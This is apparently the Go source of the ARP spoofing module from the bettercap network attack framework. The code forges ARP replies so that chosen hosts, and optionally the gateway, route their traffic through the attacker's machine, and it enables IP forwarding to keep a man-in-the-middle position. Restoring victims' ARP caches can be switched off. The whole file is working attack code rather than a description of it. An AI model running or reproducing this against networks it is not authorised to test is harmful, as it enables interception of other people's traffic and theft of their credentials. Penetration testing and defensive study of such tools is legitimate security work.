package arp_spoof

import (
	"bytes"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"
)

type ArpSpoofer struct {
	session.SessionModule
	tAddresses  []net.IP
	tMacs       []net.HardwareAddr
	wAddresses  []net.IP
	wMacs       []net.HardwareAddr
	sAdresses   []net.IP
	fullDuplex  bool
	skipRestore bool
	forward     bool
	intervalMs  int
	waitGroup   *sync.WaitGroup
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	mod := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		tAddresses:    make([]net.IP, 0),
		tMacs:         make([]net.HardwareAddr, 0),
		wAddresses:    make([]net.IP, 0),
		wMacs:         make([]net.HardwareAddr, 0),
		sAdresses:     make([]net.IP, 0),
		fullDuplex:    false,
		skipRestore:   false,
		forward:       true,
		intervalMs:    1000,
		waitGroup:     &sync.WaitGroup{},
	}

	mod.SessionModule.Requires("net.recon")

	mod.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges."))

	mod.AddParam(session.NewStringParameter("arp.spoof.whitelist", "", "", "Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing."))

	mod.AddParam((session.NewStringParameter("arp.spoof.spoofed", session.ParamGatewayAddress, "", "IP addresses to spoof, also supports nmap style IP ranges.")))

	mod.AddParam(session.NewBoolParameter("arp.spoof.fullduplex",
		"false",
		"If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail)."))

	noRestore := session.NewBoolParameter("arp.spoof.skip_restore",
		"false",
		"If set to true, targets arp cache won't be restored when spoofing is stopped.")

	mod.AddObservableParam(noRestore, func(v string) {
		if strings.ToLower(v) == "true" || v == "1" {
			mod.skipRestore = true
			mod.Warning("arp cache restoration after spoofing disabled")
		} else {
			mod.skipRestore = false
			mod.Debug("arp cache restoration after spoofing enabled")
		}
	})

	mod.AddParam(session.NewBoolParameter("arp.spoof.forwarding",
		"true",
		"If set to true, IP forwarding will be enabled."))

	mod.AddParam(session.NewIntParameter("arp.spoof.interval",
		"1000",
		"Spoofing time interval."))

	mod.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return mod.Start()
		}))

	mod.AddHandler(session.NewModuleHandler("arp.spoof off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	mod.AddHandler(session.NewModuleHandler("arp.ban off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return mod.Stop()
		}))

	return mod
}

func (mod ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (mod ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (mod ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (mod *ArpSpoofer) Configure() error {
	var err error
	var targets string
	var whitelist string
	var sTargets string

	if err, mod.fullDuplex = mod.BoolParam("arp.spoof.fullduplex"); err != nil {
		return err
	} else if err, mod.forward = mod.BoolParam("arp.spoof.forwarding"); err != nil {
		return err
	} else if err, mod.intervalMs = mod.IntParam("arp.spoof.interval"); err != nil {
		return err
	} else if err, targets = mod.StringParam("arp.spoof.targets"); err != nil {
		return err
	} else if err, whitelist = mod.StringParam("arp.spoof.whitelist"); err != nil {
		return err
	} else if err, sTargets = mod.StringParam("arp.spoof.spoofed"); err != nil {
		return err
	} else if mod.tAddresses, mod.tMacs, err = network.ParseTargets(targets, mod.Session.Lan.Aliases()); err != nil {
		return err
	} else if mod.wAddresses, mod.wMacs, err = network.ParseTargets(whitelist, mod.Session.Lan.Aliases()); err != nil {
		return err
	} else if mod.sAdresses, _, err = network.ParseTargets(sTargets, mod.Session.Lan.Aliases()); err != nil {
		return err
	}

	mod.Debug(" addresses=%v macs=%v whitelisted-addresses=%v whitelisted-macs=%v spoofed-addresses=%v", mod.tAddresses, mod.tMacs, mod.wAddresses, mod.wMacs, mod.sAdresses)

	if mod.forward {
		mod.Info("enabling forwarding")
		if !mod.Session.Firewall.IsForwardingEnabled() {
			mod.Session.Firewall.EnableForwarding(true)
		}
	} else {
		mod.Warning("forwarding is disabled")
		if mod.Session.Firewall.IsForwardingEnabled() {
			mod.Session.Firewall.EnableForwarding(false)
		}
	}

	return nil
}

func (mod *ArpSpoofer) Start() error {
	if err := mod.Configure(); err != nil {
		return err
	}

	nTargets := len(mod.tAddresses) + len(mod.tMacs)
	if nTargets == 0 {
		mod.Warning("list of targets is empty, module not starting.")
		return nil
	}

	return mod.SetRunning(true, func() {
		nSpoofed := len(mod.sAdresses)

		mod.Info("arp spoofer started spoofing %d addresses, probing %d targets.", nSpoofed, nTargets)

		if mod.fullDuplex {
			mod.Warning("full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.")
		}

		mod.waitGroup.Add(1)
		defer mod.waitGroup.Done()

		myMAC := mod.Session.Interface.HW
		for mod.Running() {
			for _, address := range mod.sAdresses {
				if net.IP.Equal(address, mod.Session.Gateway.IP) || !mod.Session.Skip(address) {
					mod.arpSpoofTargets(address, myMAC, true, false)
				}
			}

			time.Sleep(time.Duration(mod.intervalMs) * time.Millisecond)
		}
	})
}

func (mod *ArpSpoofer) unSpoof() error {
	if !mod.skipRestore {
		nTargets := len(mod.tAddresses) + len(mod.tMacs)
		mod.Info("restoring ARP cache of %d targets.", nTargets)

		for _, address := range mod.sAdresses {
			if net.IP.Equal(address, mod.Session.Gateway.IP) || !mod.Session.Skip(address) {
				if realMAC, err := mod.Session.FindMAC(address, false); err == nil {
					mod.arpSpoofTargets(address, realMAC, false, false)
				} else {
					mod.Warning("cannot find mac address for %s, cannot restore", address.String())
				}
			}
		}
	} else {
		mod.Warning("arp cache restoration is disabled")
	}

	return nil
}

func (mod *ArpSpoofer) Stop() error {
	return mod.SetRunning(false, func() {
		mod.Info("waiting for ARP spoofer to stop ...")
		mod.unSpoof()
		mod.waitGroup.Wait()
	})
}

func (mod *ArpSpoofer) isWhitelisted(ip string, mac net.HardwareAddr) bool {
	for _, addr := range mod.wAddresses {
		if ip == addr.String() {
			return true
		}
	}

	for _, hw := range mod.wMacs {
		if bytes.Equal(hw, mac) {
			return true
		}
	}

	return false
}

func (mod *ArpSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
	targets := make(map[string]net.HardwareAddr)

	// add targets specified by IP address
	for _, ip := range mod.tAddresses {
		if mod.Session.Skip(ip) {
			continue
		}
		// do we have this ip mac address?
		if hw, err := mod.Session.FindMAC(ip, probe); err == nil {
			targets[ip.String()] = hw
		}
	}
	// add targets specified by MAC address
	for _, hw := range mod.tMacs {
		if ip, err := network.ArpInverseLookup(mod.Session.Interface.Name(), hw.String(), false); err == nil {
			if mod.Session.Skip(net.ParseIP(ip)) {
				continue
			}
			targets[ip] = hw
		}
	}

	return targets
}

func (mod *ArpSpoofer) arpSpoofTargets(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	mod.waitGroup.Add(1)
	defer mod.waitGroup.Done()

	gwIP := mod.Session.Gateway.IP
	gwHW := mod.Session.Gateway.HW
	ourHW := mod.Session.Interface.HW
	isGW := false
	isSpoofing := false

	// are we spoofing the gateway IP?
	if net.IP.Equal(saddr, gwIP) {
		isGW = true
		// are we restoring the original MAC of the gateway?
		if !bytes.Equal(smac, gwHW) {
			isSpoofing = true
		}
	}

	if targets := mod.getTargets(probe); len(targets) == 0 {
		mod.Warning("could not find spoof targets")
	} else {
		for ip, mac := range targets {
			if check_running && !mod.Running() {
				return
			} else if mod.isWhitelisted(ip, mac) {
				mod.Debug("%s (%s) is whitelisted, skipping from spoofing loop.", ip, mac)
				continue
			} else if saddr.String() == ip {
				continue
			}

			if bytes.Equal(smac, ourHW) {
				mod.Debug("telling %s (%s) we are %s", ip, mac, saddr.String())
			} else {
				mod.Debug("telling %s (%s) %s is %s", ip, mac, smac, saddr.String())
			}

			rawIP := net.ParseIP(ip)
			if err, pkt := packets.NewARPReply(saddr, smac, rawIP, mac); err != nil {
				mod.Error("error while creating ARP spoof packet for %s: %s", ip, err)
			} else {
				mod.Debug("sending %d bytes of ARP packet to %s:%s.", len(pkt), ip, mac.String())
				mod.Session.Queue.Send(pkt)
			}

			if mod.fullDuplex && isGW {
				err := error(nil)
				gwPacket := []byte(nil)

				if isSpoofing {
					mod.Debug("telling the gw we are %s", ip)
					// we told the target we're the gateway, now let's tell the
					// gateway that we are the target
					if err, gwPacket = packets.NewARPReply(rawIP, ourHW, gwIP, gwHW); err != nil {
						mod.Error("error while creating ARP spoof packet: %s", err)
					}
				} else {
					mod.Debug("telling the gw %s is %s", ip, mac)
					// send the gateway the original MAC of the target
					if err, gwPacket = packets.NewARPReply(rawIP, mac, gwIP, gwHW); err != nil {
						mod.Error("error while creating ARP spoof packet: %s", err)
					}
				}

				if gwPacket != nil {
					mod.Debug("sending %d bytes of ARP packet to the gateway", len(gwPacket))
					if err = mod.Session.Queue.Send(gwPacket); err != nil {
						mod.Error("error while sending packet: %v", err)
					}
				}
			}
		}
	}
}
